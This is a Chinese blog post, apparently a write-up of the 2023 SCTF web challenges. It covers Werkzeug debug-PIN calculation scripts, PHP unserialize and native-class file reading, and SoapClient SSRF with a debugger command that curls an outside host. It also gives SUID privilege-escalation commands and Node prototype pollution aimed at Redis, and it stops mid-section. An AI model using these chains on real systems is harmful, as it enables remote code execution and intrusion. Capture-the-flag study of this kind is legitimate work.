<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="2023SCTF web"><meta name="keywords" content="pin码计算  imagick  原型链污染 原生类利用"><meta name="author" content="kkkl"><meta name="copyright" content="kkkl"><title>2023SCTF web | kkkl's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '6.3.0'
} </script><meta name="generator" content="Hexo 6.3.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#linux"><span class="toc-number">1.</span> <span class="toc-text">linux</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pypyp"><span class="toc-number"></span> <span class="toc-text">pypyp?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#an4er-monitor"><span class="toc-number"></span> <span class="toc-text">an4er_monitor</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#fumo-backdoor"><span class="toc-number"></span> <span class="toc-text">fumo_backdoor</span></a></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://s1.ax1x.com/2023/06/16/pCQFH00.jpg"></div><div class="author-info__name text-center">kkkl</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">8</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">8</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://gh0st.vip/">gh0st</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://s1.ax1x.com/2023/06/14/pCn3c6O.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">kkkl's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/About">Ablout</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">2023SCTF web</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-06-23</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>pin码 获取 </p>
<h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><p>在linux下 主要又这六个变量 来组成 pin码</p>
<ul>
<li><p>username 启动这个 Flask 的用户</p>
</li>
<li><p>modname 一般默认 flask.app</p>
</li>
<li><p><code>getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</code> 一般默认 flask.app 为 Flask</p>
</li>
<li><p><code>getattr(mod, &#39;__file__&#39;, None)</code>为 flask 目录下的一个 app.py 的绝对路径,可在爆错页面看到</p>
</li>
<li><p><code>str(uuid.getnode())</code> 则是网卡 MAC 地址的十进制表达式</p>
</li>
<li><p><code>get_machine_id()</code> 系统 id</p>
</li>
</ul>
<p> username 就是 启动这个Flask 进程的用户</p>
<p><code>getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</code></p>
<p>他是 flask目录下的app.py</p>
<p>在python3 中是 app.py  在python2 中是 app.pyc</p>
<p>例如&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python2.7&#x2F;dist-packages&#x2F;flask&#x2F;app.pyc</p>
<p>str(uuid.getnode()) 他是MAC 地址 在linux中读取的是 </p>
<p>&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address 或者是 &#x2F;sys&#x2F;class&#x2F;net&#x2F;ens33&#x2F;address</p>
<p>然后得到的是</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCYIxDU"><img src="https://s1.ax1x.com/2023/06/23/pCYIxDU.png" alt="pCYIxDU.png"></a></p>
<p>需要把他转换成十进制</p>
<p>52:54:00:94:99:a8 这里用python 直接转</p>
<p><code>int(&quot;5254009499a8&quot;,16)</code></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCYopE4"><img src="https://s1.ax1x.com/2023/06/23/pCYopE4.png" alt="pCYopE4.png"></a></p>
<p>90520740469160</p>
<p> <code>get_machine_id()</code> 系统id </p>
<p>这里是定义它的函数</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCYoiCR"><img src="https://s1.ax1x.com/2023/06/23/pCYoiCR.png" alt="pCYoiCR.png"></a></p>
<p>先看到这里是 从 <code>/etc/machine-id </code> 和 <code>/proc/sys/kernel/random/boot_id</code>获取里面的值  f.readline() 应该是获取的第一行吧</p>
<p>然后发现 如果 存在 value j就 吧 value赋值给linux 然后 直接 break 退出for循环  意思就是说  以上两个文件 如果存在第一个文件就会读取第一个文件的第一行 然后返回 如果不存在第一个文件 才会读取第二个文件 然后取第一行的值</p>
<p>然后继续读取下面的&#x2F;proc&#x2F;self&#x2F;cgroup  然后进行拼接</p>
<p>这个是更新之后的  在 2020.1.5 之前的话是 只要读取到上面三个任何一个  只要读取到了 就立马返回</p>
<p>生成pin码脚本</p>
<p>因为这里是低版本的是 md5  高版本的sha1 加密  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span><span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.6/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485378023426&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address 或者是  /sys/class/net/eth0/address</span></span><br><span class="line">    <span class="string">&#x27;349b3354-f67f-4438-b395-4fbc01171fdd&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id 或者 /proc/sys/kernel/random/boot_id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"><span class="comment">#Cookie: __wzd6f8fda3c885a87bfdbd4=1687315469|eef41ef13b05;</span></span><br></pre></td></tr></table></figure>

<h1 id="pypyp"><a href="#pypyp" class="headerlink" title="pypyp?"></a>pypyp?</h1><p>这个题   之前在做web的checkin的时候 由于他是81 端口 checkin是82端口 然后我就偶然发下了这个靶机  但是也没啥用</p>
<p>显示session no started  并且可以访问index.php 所以后端应该是php 然后 php 可以利用 Session Upload Progress 来强制开启session</p>
<p>需要在传文件的同时加入一个 Session Upload Progess 参数 然后并且携带一个PHPSESSID 去访问 就会强制开启session 会话</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP_SESSION_UPLOAD_PROGRESS</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCYokgx"><img src="https://s1.ax1x.com/2023/06/23/pCYokgx.png" alt="pCYokgx.png"></a></p>
<p>显示出源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//if(!isset($_SESSION))&#123;</span></span><br><span class="line"><span class="comment">//    die(&#x27;Session not started&#x27;);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$type</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"><span class="variable">$properties</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;properties&#x27;</span>];</span><br><span class="line"><span class="comment">//echo urlencode($_POST[&#x27;data&#x27;]);</span></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="comment">//if(unserialize(urldecode($properties)))&#123;</span></span><br><span class="line"><span class="comment">//    phpinfo();</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//var_dump($properties);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$properties</span>)&amp;&amp;<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>)))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>((<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>)));</span><br><span class="line">    <span class="variable">$object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>));</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$object</span>);</span><br><span class="line">    <span class="variable">$object</span> -&gt; <span class="title function_ invoke__">sctf</span>();</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$properties</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$type</span>.<span class="string">&quot;(&quot;</span>.<span class="variable">$properties</span>[<span class="number">0</span>].<span class="string">&quot;,&quot;</span>.<span class="variable">$properties</span>[<span class="number">1</span>].<span class="string">&quot;)&quot;</span>);</span><br><span class="line">    <span class="variable">$object</span> = <span class="keyword">new</span> <span class="variable">$type</span>(<span class="variable">$properties</span>[<span class="number">0</span>],<span class="variable">$properties</span>[<span class="number">1</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//    phpinfo();</span></span><br><span class="line">    <span class="variable">$object</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;http://127.0.0.1:5000/&#x27;</span>.<span class="variable">$properties</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//echo &quot;this is the object: $object &lt;br&gt;&quot;;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看到三个if分支 然后里面 有各自的功能</p>
<p>虽然 他是从 session 中取出来的 $properties 变量 但是有个  extract 函数 可以进行变量覆盖</p>
<p>然后先看第一个if分支            可以反序列化数据 然后看第二个 可以实例化对象 并且 由于变量覆盖参数都是可控的</p>
<p> 最后一个if分支看到 内网开了一个5000端口的服务 </p>
<p>这里可以先来看一下5000 端口是什么服务 </p>
<p>不让是数组 然后 反序列化不成功就可以进入最后一个 if分支</p>
<p>看到 5000端口开了一个 flask 服务</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCYoAv6"><img src="https://s1.ax1x.com/2023/06/23/pCYoAv6.png" alt="pCYoAv6.png"></a></p>
<p>第二个if 可以进行 实例化 对象 这个可以实例化原生类   然后这里面有几个原生类可以读文件 然后</p>
<p>因为它里面有第二个参数  所以 可以用 SplFileObject 来读文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="string">&quot;type&quot;</span> =&gt; <span class="string">&quot;SplFileObject&quot;</span>, <span class="string">&quot;properties&quot;</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;php://filter/convert.base64-encode/resource=/proc/self/cgroup&quot;</span>,<span class="string">&quot;r&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>读不到 flag  应该是没有权限</p>
<p> 然后 可以 先确认一下有没有flag文件</p>
<p>这里可以用 FilesystemIterator 来读目录</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$properties</span>=<span class="keyword">array</span>(<span class="string">&#x27;glob://*&#x27;</span>,);</span><br><span class="line"><span class="variable">$type</span>=<span class="string">&quot;FilesystemIterator&quot;</span>;</span><br><span class="line"><span class="comment">//var_dump($type);</span></span><br><span class="line"><span class="comment">//var_dump($properties[1]);</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="variable">$type</span>(<span class="variable">$properties</span>[<span class="number">0</span>],<span class="variable">$properties</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//$a = new FilesystemIterator(&quot;glob://*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);&#125;</span></span><br><span class="line"><span class="comment">//$a= new FilesystemIterator(&quot;glob://*&quot;,&#x27;1&#x27;);</span></span><br><span class="line"><span class="comment">//echo  $a;</span></span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&#x27;type&#x27;</span>=&gt;<span class="string">&#x27;FilesystemIterator&#x27;</span>,<span class="string">&#x27;properties&#x27;</span>=&gt;<span class="keyword">array</span>(<span class="string">&#x27;glob:///fla*&#x27;</span>,<span class="string">&#x27;1&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCYoZDO"><img src="https://s1.ax1x.com/2023/06/23/pCYoZDO.png" alt="pCYoZDO.png"></a></p>
<p>看到根目录 有flag文件</p>
<p>但是没有权限读  需要提权 谈个shell  去提权</p>
<p>因为开了debug 所以需要算 pin码 这里去读文件然后算pin码  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;app&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/lib/python3.8/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485378023426&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">b&#x27;349b3354-f67f-4438-b395-4fbc01171fdd96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cookie_name)</span><br></pre></td></tr></table></figure>

<p>还要算cookie </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span>  time</span><br><span class="line"><span class="comment"># while 1:</span></span><br><span class="line">pin = <span class="string">&quot;565-443-076&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># while 1:</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash_pin</span>(<span class="params">pin: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha1(<span class="string">f&quot;<span class="subst">&#123;pin&#125;</span> added salt&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;replace&quot;</span>)).hexdigest()[:<span class="number">12</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(time.time())&#125;</span>|<span class="subst">&#123;hash_pin(pin)&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(time.time())</span><br><span class="line"><span class="comment">#__wzd6f8fda3c885a87bfdbd4=1687328073|eef41ef13b05</span></span><br><span class="line"><span class="comment">#                          1687328069|eef41ef13b05</span></span><br></pre></td></tr></table></figure>

<p>由于get请求不能传cookie   但是这里有原生类  SoapClient 可以csrf 可以传进去cookie</p>
<p>所以 </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1:5000/console?&amp;__debugger__=yes&amp;cmd=__import__(%22os%22).popen(%22curl%208xxxxxxx6%3A2333%22)&amp;frm=0&amp;s=DhOJxtvMXCtezvKtqaK9&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: __wzdb2a60e2b19822632a67c=1687106351|11b8517fb9fb&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;test\r\n&quot;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$headers</span>),<span class="string">&#x27;uri&#x27;</span>=&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"><span class="variable">$arr</span>=<span class="title function_ invoke__">Array</span>(<span class="string">&quot;properties&quot;</span>=&gt;<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>)));</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$aaa</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里要注意url编码问题 </p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCYouUH"><img src="https://s1.ax1x.com/2023/06/23/pCYouUH.png" alt="pCYouUH.png"></a></p>
<p>这里会先解码一次 所以我们需要编码一次 但是 一次是不行的 他回到服务端解码一次 所以需要编码两次要 反序列化的数据 </p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCYo3xP"><img src="https://s1.ax1x.com/2023/06/23/pCYo3xP.png" alt="pCYo3xP.png"></a></p>
<p>只编码 阴影部分</p>
<p>复现的环境应该是有问题 </p>
<p>这里别人的镜像 是不用编码的 。。。。</p>
<p>找了个别人搭建好的镜像</p>
<p>suid提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -4000 -<span class="built_in">type</span> f -<span class="built_in">exec</span> <span class="built_in">ls</span> -la &#123;&#125; 2&gt;/dev/null \;</span><br><span class="line">find / -uid 0 -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">curl file:///flag</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCYxDDs"><img src="https://s1.ax1x.com/2023/06/23/pCYxDDs.png" alt="pCYxDDs.png"></a></p>
<h1 id="an4er-monitor"><a href="#an4er-monitor" class="headerlink" title="an4er_monitor"></a>an4er_monitor</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Generated by nginxconfig.io</span><br><span class="line"># See nginxconfig.txt for the configuration share link</span><br><span class="line"></span><br><span class="line">user                 www-data;</span><br><span class="line">pid                  /run/nginx.pid;</span><br><span class="line">worker_processes     auto;</span><br><span class="line">worker_rlimit_nofile 65535;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    multi_accept       on;</span><br><span class="line">    worker_connections 65535;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    charset                utf-8;</span><br><span class="line">    sendfile               on;</span><br><span class="line">    tcp_nopush             on;</span><br><span class="line">    tcp_nodelay            on;</span><br><span class="line">    server_tokens          off;</span><br><span class="line">    log_not_found          off;</span><br><span class="line">    types_hash_max_size    2048;</span><br><span class="line">    types_hash_bucket_size 64;</span><br><span class="line">    client_max_body_size   16M;</span><br><span class="line"></span><br><span class="line">    # MIME</span><br><span class="line">    include                mime.types;</span><br><span class="line">    default_type           application/octet-stream;</span><br><span class="line"></span><br><span class="line">    # Logging</span><br><span class="line">    access_log             off;</span><br><span class="line">    error_log              /dev/null;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        listen [::]:80;</span><br><span class="line">        server_name 127.0.0.1;</span><br><span class="line">        location / &#123;</span><br><span class="line">         root /usr/share/nginx/html;</span><br><span class="line">         index index.html;</span><br><span class="line">         try_files $uri $uri/ /index.html;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location /api/server &#123;</span><br><span class="line">          proxy_pass http://127.0.0.1:3000;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>nginx 配置 开启了外网端口80</p>
<p> 然后 匹配到  &#x2F;api&#x2F;server 然后辉匹配到 3000 端口  </p>
<p>有几个路由 有用的路由就是 &#x2F;api&#x2F;server&#x2F;check 路由 然后里面有个http.get</p>
<p> &#x2F;api&#x2F;server&#x2F;import 一个导入路由 可以往</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> validUrls = &#123;<span class="string">&quot;urls&quot;</span>: &#123;&#125;&#125;;</span><br></pre></td></tr></table></figure>

<p>添加ip 用于访问 这里用0.0.0.0 绕过 127.0.0.1 和localhost</p>
<p>需要在 redis 里面设置 IsAdminSession</p>
<p>里面有merege  函数可以原型链污染</p>
<p>去看 http.get 函数源码</p>
<p><a target="_blank" rel="noopener" href="https://github.com/nodejs/node/blob/v20.2.0/lib/http.js">https://github.com/nodejs/node/blob/v20.2.0/lib/http.js</a></p>
<p>里面传入的是对象</p>
<p>可以去污染</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCYoJr8"><img src="https://s1.ax1x.com/2023/06/23/pCYoJr8.png" alt="pCYoJr8.png"></a></p>
<p>然后把metod 污染成 SET   socketPath 污染为 &#x2F;run&#x2F;redis&#x2F;redis.sock</p>
<p>污染方式为 <code>import?urls.__proto__.__proto__.method=SET</code></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCYoUaQ"><img src="https://s1.ax1x.com/2023/06/23/pCYoUaQ.png" alt="pCYoUaQ.png"></a></p>
<p>可以正常的污染上</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCYoyrT"><img src="https://s1.ax1x.com/2023/06/23/pCYoyrT.png" alt="pCYoyrT.png"></a></p>
<h1 id="fumo-backdoor"><a href="#fumo-backdoor" class="headerlink" title="fumo_backdoor"></a>fumo_backdoor</h1><p>php session 存储机制</p>
<p>session 数据是以文件的形式存储的  存储的文件名是 sess_sessionid 来决定文件名的</p>
<p> 其中序列化之后的数据有三种格式 </p>
<p>他是由 session.serialize_handler 来决定的  </p>
<p>第一种</p>
<p>php 存储格式是 键名 + 竖线| 经过序列化之后的值</p>
<p>第二种</p>
<p>php_binary </p>
<p>键名的长度对应的ascii字符 +键名+ 经过 serialize 函数序列化处理的值</p>
<p>第三种</p>
<p>php_serialize </p>
<p>经过序列化函数处理的数组</p>
<p>先看 php处理器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_SESSION[&#x27;kkkl&#x27;]=‘1234’</span><br></pre></td></tr></table></figure>

<p>序列化之后的内容为 </p>
